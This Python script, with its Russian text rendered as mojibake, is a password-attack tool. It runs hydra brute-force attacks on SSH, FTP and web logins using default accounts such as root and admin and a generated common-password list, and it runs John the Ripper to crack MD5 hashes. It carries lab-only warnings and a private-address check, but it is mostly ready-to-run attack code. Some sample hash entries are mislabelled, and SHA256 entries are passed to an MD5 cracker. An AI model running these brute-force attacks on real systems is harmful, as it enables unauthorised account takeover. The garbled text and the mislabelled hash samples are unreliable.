#!/usr/bin/env python3
"""
–û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∞—Ç–∞–∫ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º John the Ripper
–í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Å—Ä–µ–¥–µ!

–ê–≤—Ç–æ—Ä: –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –º–∞—Ç–µ—Ä–∏–∞–ª –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
–õ–∏—Ü–µ–Ω–∑–∏—è: –¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π
"""

import subprocess
import sys
import os
import argparse
import time
import threading
from concurrent.futures import ThreadPoolExecutor

class JohnTheRipperAttacks:
    """
    –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –∞—Ç–∞–∫ —Å John the Ripper
    """
    
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.common_passwords = [
            'password', '123456', 'admin', 'root', 'kali', 'toor',
            'password123', 'admin123', 'root123', 'kali123',
            'Password', 'Admin', 'Root', 'Kali',
            'P@ssw0rd', 'Adm1n', 'R00t', 'K@li',
            '12345678', 'qwerty', 'abc123', 'password1',
            'welcome', 'login', 'master', 'hello',
            'letmein', 'welcome123', 'monkey', 'dragon'
        ]
        self.common_usernames = [
            'root', 'admin', 'kali', 'user', 'test', 'guest',
            'administrator', 'ubuntu', 'debian', 'www-data',
            'apache', 'nginx', 'mysql', 'postgres', 'oracle'
        ]
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
        if not self._is_safe_target(target_ip):
            print("‚ùå –û–®–ò–ë–ö–ê: –ê—Ç–∞–∫–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω—ã —Ç–æ–ª—å–∫–æ –¥–ª—è –ª–æ–∫–∞–ª—å–Ω—ã—Ö —Å–µ—Ç–µ–π!")
            sys.exit(1)
    
    def _is_safe_target(self, ip):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Ü–µ–ª–∏"""
        safe_prefixes = ['127.', '192.168.', '10.']
        
        if ip.startswith('172.'):
            try:
                second_octet = int(ip.split('.')[1])
                return 16 <= second_octet <= 31
            except:
                return False
        
        return any(ip.startswith(prefix) for prefix in safe_prefixes)
    
    def check_john_installed(self):
        """
        –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ John the Ripper
        """
        try:
            result = subprocess.run(['john', '--version'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"‚úÖ John the Ripper —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: {result.stdout.strip()}")
                return True
            else:
                print("‚ùå John the Ripper –Ω–µ –Ω–∞–π–¥–µ–Ω")
                return False
        except FileNotFoundError:
            print("‚ùå John the Ripper –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
            print("üí° –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ: brew install john-jumbo")
            return False
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ John: {e}")
            return False
    
    def generate_password_list(self, filename="passwords.txt"):
        """
        –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ø–∏—Å–∫–∞ –ø–∞—Ä–æ–ª–µ–π –¥–ª—è –∞—Ç–∞–∫–∏
        """
        print(f"üìù –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π: {filename}")
        
        passwords = []
        
        # –î–æ–±–∞–≤–ª—è–µ–º –æ–±—â–∏–µ –ø–∞—Ä–æ–ª–∏
        passwords.extend(self.common_passwords)
        
        # –î–æ–±–∞–≤–ª—è–µ–º –ø–∞—Ä–æ–ª–∏ —Å —Ü–∏—Ñ—Ä–∞–º–∏
        for pwd in self.common_passwords[:10]:
            for i in range(10):
                passwords.append(f"{pwd}{i}")
                passwords.append(f"{i}{pwd}")
        
        # –î–æ–±–∞–≤–ª—è–µ–º –ø–∞—Ä–æ–ª–∏ —Å —Å–∏–º–≤–æ–ª–∞–º–∏
        symbols = ['!', '@', '#', '$', '%', '^', '&', '*']
        for pwd in self.common_passwords[:5]:
            for sym in symbols:
                passwords.append(f"{pwd}{sym}")
                passwords.append(f"{sym}{pwd}")
        
        # –£–¥–∞–ª—è–µ–º –¥—É–±–ª–∏–∫–∞—Ç—ã
        passwords = list(set(passwords))
        
        # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –≤ —Ñ–∞–π–ª
        with open(filename, 'w') as f:
            for pwd in passwords:
                f.write(f"{pwd}\n")
        
        print(f"‚úÖ –°–æ–∑–¥–∞–Ω —Ñ–∞–π–ª —Å {len(passwords)} –ø–∞—Ä–æ–ª—è–º–∏")
        return filename
    
    def ssh_brute_force(self, username=None, password_file=None, max_attempts=100):
        """
        SSH Brute Force –∞—Ç–∞–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º hydra
        """
        print(f"üîê SSH Brute Force –∞—Ç–∞–∫–∞ –Ω–∞ {self.target_ip}")
        
        if not username:
            username = 'root'  # –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é –ø—Ä–æ–±—É–µ–º root
        
        if not password_file:
            password_file = self.generate_password_list()
        
        print(f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}")
        print(f"üìÅ –§–∞–π–ª –ø–∞—Ä–æ–ª–µ–π: {password_file}")
        print(f"üî¢ –ú–∞–∫—Å–∏–º—É–º –ø–æ–ø—ã—Ç–æ–∫: {max_attempts}")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å SSH
        print("\nüîç –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å SSH...")
        try:
            result = subprocess.run(['nc', '-z', '-w', '3', self.target_ip, '22'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode != 0:
                print("‚ùå SSH –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É 22")
                return False
        except FileNotFoundError:
            print("‚ö†Ô∏è  netcat –Ω–µ –Ω–∞–π–¥–µ–Ω, –ø—Ä–æ–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –ø–æ—Ä—Ç–∞")
        except Exception as e:
            print(f"‚ö†Ô∏è  –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ SSH: {e}")
        
        print("‚úÖ SSH –¥–æ—Å—Ç—É–ø–µ–Ω, –Ω–∞—á–∏–Ω–∞–µ–º brute force...")
        
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º hydra –¥–ª—è SSH brute force
        try:
            cmd = [
                'hydra', '-l', username, '-P', password_file,
                '-t', '4', '-f', '-v', '1',
                f'ssh://{self.target_ip}'
            ]
            
            print(f"üöÄ –í—ã–ø–æ–ª–Ω—è–µ–º: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                print("üéâ –£–°–ü–ï–•! –ù–∞–π–¥–µ–Ω –ø–∞—Ä–æ–ª—å!")
                print(result.stdout)
                return True
            else:
                print("‚ùå –ü–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
                print("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:")
                print(f"  ‚Ä¢ –ü–æ–ø—ã—Ç–æ–∫: {max_attempts}")
                print(f"  ‚Ä¢ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}")
                print(f"  ‚Ä¢ –†–µ–∑—É–ª—å—Ç–∞—Ç: –ù–µ—É–¥–∞—á–∞")
                return False
                
        except subprocess.TimeoutExpired:
            print("‚è±Ô∏è  Timeout - –∞—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ –≤—Ä–µ–º–µ–Ω–∏")
            return False
        except FileNotFoundError:
            print("‚ùå Hydra –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
            print("üí° –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ: brew install hydra")
            return False
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ SSH brute force: {e}")
            return False
    
    def ftp_brute_force(self, username=None, password_file=None):
        """
        FTP Brute Force –∞—Ç–∞–∫–∞
        """
        print(f"üìÅ FTP Brute Force –∞—Ç–∞–∫–∞ –Ω–∞ {self.target_ip}")
        
        if not username:
            username = 'anonymous'
        
        if not password_file:
            password_file = self.generate_password_list()
        
        print(f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}")
        print(f"üìÅ –§–∞–π–ª –ø–∞—Ä–æ–ª–µ–π: {password_file}")
        
        try:
            cmd = [
                'hydra', '-l', username, '-P', password_file,
                '-t', '4', '-f', '-v', '1',
                f'ftp://{self.target_ip}'
            ]
            
            print(f"üöÄ –í—ã–ø–æ–ª–Ω—è–µ–º: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                print("üéâ –£–°–ü–ï–•! –ù–∞–π–¥–µ–Ω FTP –ø–∞—Ä–æ–ª—å!")
                print(result.stdout)
                return True
            else:
                print("‚ùå FTP –ø–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
                return False
                
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ FTP brute force: {e}")
            return False
    
    def web_login_brute_force(self, url, username=None, password_file=None):
        """
        Web Login Brute Force –∞—Ç–∞–∫–∞
        """
        print(f"üåê Web Login Brute Force –∞—Ç–∞–∫–∞ –Ω–∞ {url}")
        
        if not username:
            username = 'admin'
        
        if not password_file:
            password_file = self.generate_password_list()
        
        print(f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}")
        print(f"üìÅ –§–∞–π–ª –ø–∞—Ä–æ–ª–µ–π: {password_file}")
        
        try:
            cmd = [
                'hydra', '-l', username, '-P', password_file,
                '-t', '4', '-f', '-v', '1',
                url
            ]
            
            print(f"üöÄ –í—ã–ø–æ–ª–Ω—è–µ–º: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                print("üéâ –£–°–ü–ï–•! –ù–∞–π–¥–µ–Ω web –ø–∞—Ä–æ–ª—å!")
                print(result.stdout)
                return True
            else:
                print("‚ùå Web –ø–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
                return False
                
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ web brute force: {e}")
            return False
    
    def hash_cracking(self, hash_file, wordlist=None):
        """
        –í–∑–ª–æ–º —Ö–µ—à–µ–π —Å –ø–æ–º–æ—â—å—é John the Ripper
        """
        print(f"üîì –í–∑–ª–æ–º —Ö–µ—à–µ–π –∏–∑ —Ñ–∞–π–ª–∞: {hash_file}")
        
        if not os.path.exists(hash_file):
            print(f"‚ùå –§–∞–π–ª {hash_file} –Ω–µ –Ω–∞–π–¥–µ–Ω")
            return False
        
        if not wordlist:
            wordlist = self.generate_password_list()
        
        print(f"üìÅ –°–ª–æ–≤–∞—Ä—å: {wordlist}")
        
        try:
            # –ó–∞–ø—É—Å–∫–∞–µ–º John the Ripper
            cmd = ['john', '--wordlist=' + wordlist, '--format=raw-md5', hash_file]
            
            print(f"üöÄ –í—ã–ø–æ–ª–Ω—è–µ–º: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                print("üéâ –£–°–ü–ï–•! –•–µ—à–∏ –≤–∑–ª–æ–º–∞–Ω—ã!")
                
                # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
                show_cmd = ['john', '--show', '--format=raw-md5', hash_file]
                show_result = subprocess.run(show_cmd, capture_output=True, text=True)
                
                if show_result.returncode == 0:
                    print("üìä –ù–∞–π–¥–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏:")
                    print(show_result.stdout)
                
                return True
            else:
                print("‚ùå –•–µ—à–∏ –Ω–µ –≤–∑–ª–æ–º–∞–Ω—ã")
                return False
                
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –≤–∑–ª–æ–º–∞ —Ö–µ—à–µ–π: {e}")
            return False
    
    def create_sample_hashes(self, filename="hashes.txt"):
        """
        –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ —Å –ø—Ä–∏–º–µ—Ä–Ω—ã–º–∏ —Ö–µ—à–∞–º–∏ –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
        """
        print(f"üìù –°–æ–∑–¥–∞–µ–º —Ñ–∞–π–ª —Å –ø—Ä–∏–º–µ—Ä–∞–º–∏ —Ö–µ—à–µ–π: {filename}")
        
        # –ü—Ä–∏–º–µ—Ä—ã MD5 —Ö–µ—à–µ–π (–≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –Ω—É–∂–Ω–æ –ø–æ–ª—É—á–∞—Ç—å —Å —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã)
        sample_hashes = [
            "5d41402abc4b2a76b9719d911017c592:hello",  # hello
            "098f6bcd4621d373cade4e832627b4f6:test",   # test
            "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:hello",  # hello (SHA256)
            "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3:hello",  # hello (SHA256)
        ]
        
        with open(filename, 'w') as f:
            for hash_line in sample_hashes:
                f.write(f"{hash_line}\n")
        
        print(f"‚úÖ –°–æ–∑–¥–∞–Ω —Ñ–∞–π–ª —Å {len(sample_hashes)} —Ö–µ—à–∞–º–∏")
        return filename

def main():
    """
    –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è John the Ripper –∞—Ç–∞–∫
    """
    print("=" * 60)
    print("üîì –û–ë–†–ê–ó–û–í–ê–¢–ï–õ–¨–ù–´–ï –ê–¢–ê–ö–ò –° JOHN THE RIPPER")
    print("=" * 60)
    print("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏!")
    print("‚ö†Ô∏è  –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä–æ—Ç–∏–≤ —á—É–∂–∏—Ö —Å–∏—Å—Ç–µ–º –ù–ï–ó–ê–ö–û–ù–ù–û!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='–û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–µ –∞—Ç–∞–∫–∏ —Å John the Ripper')
    parser.add_argument('target', help='IP –∞–¥—Ä–µ—Å —Ü–µ–ª–∏')
    parser.add_argument('--ssh', action='store_true', help='SSH brute force')
    parser.add_argument('--ftp', action='store_true', help='FTP brute force')
    parser.add_argument('--web', help='Web login brute force (URL)')
    parser.add_argument('--hash', help='–í–∑–ª–æ–º —Ö–µ—à–µ–π (—Ñ–∞–π–ª —Å —Ö–µ—à–∞–º–∏)')
    parser.add_argument('--create-hashes', action='store_true', help='–°–æ–∑–¥–∞—Ç—å –ø—Ä–∏–º–µ—Ä—ã —Ö–µ—à–µ–π')
    parser.add_argument('-u', '--username', help='–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è')
    parser.add_argument('-w', '--wordlist', help='–§–∞–π–ª —Å–æ —Å–ª–æ–≤–∞—Ä–µ–º –ø–∞—Ä–æ–ª–µ–π')
    
    args = parser.parse_args()
    
    # –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
    john_tool = JohnTheRipperAttacks(args.target)
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —É—Å—Ç–∞–Ω–æ–≤–∫—É John
    if not john_tool.check_john_installed():
        print("‚ùå John the Ripper –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –µ–≥–æ –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è.")
        return
    
    try:
        if args.create_hashes:
            john_tool.create_sample_hashes()
        
        elif args.ssh:
            john_tool.ssh_brute_force(args.username, args.wordlist)
        
        elif args.ftp:
            john_tool.ftp_brute_force(args.username, args.wordlist)
        
        elif args.web:
            john_tool.web_login_brute_force(args.web, args.username, args.wordlist)
        
        elif args.hash:
            john_tool.hash_cracking(args.hash, args.wordlist)
        
        else:
            print("‚ùå –í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø –∞—Ç–∞–∫–∏: --ssh, --ftp, --web, --hash –∏–ª–∏ --create-hashes")
            
    except KeyboardInterrupt:
        print("\nüõë –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
    
    print("\nüìö –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:")
    print("‚Ä¢ John the Ripper - –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –≤–∑–ª–æ–º–∞ –ø–∞—Ä–æ–ª–µ–π")
    print("‚Ä¢ Brute Force - –ø–µ—Ä–µ–±–æ—Ä –ø–∞—Ä–æ–ª–µ–π –ø–æ —Å–ª–æ–≤–∞—Ä—é")
    print("‚Ä¢ Hash Cracking - –≤–∑–ª–æ–º —Ö–µ—à–µ–π –ø–∞—Ä–æ–ª–µ–π")
    print("‚Ä¢ Hydra - –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è —Å–µ—Ç–µ–≤—ã—Ö brute force –∞—Ç–∞–∫")
    print("\nüõ°Ô∏è  –ú–µ—Ç–æ–¥—ã –∑–∞—â–∏—Ç—ã:")
    print("‚Ä¢ –°–∏–ª—å–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ –∏ –ø–æ–ª–∏—Ç–∏–∫–∏ –ø–∞—Ä–æ–ª–µ–π")
    print("‚Ä¢ –î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è")
    print("‚Ä¢ –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–æ–ø—ã—Ç–æ–∫ –≤—Ö–æ–¥–∞")
    print("‚Ä¢ –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏")

if __name__ == "__main__":
    main()
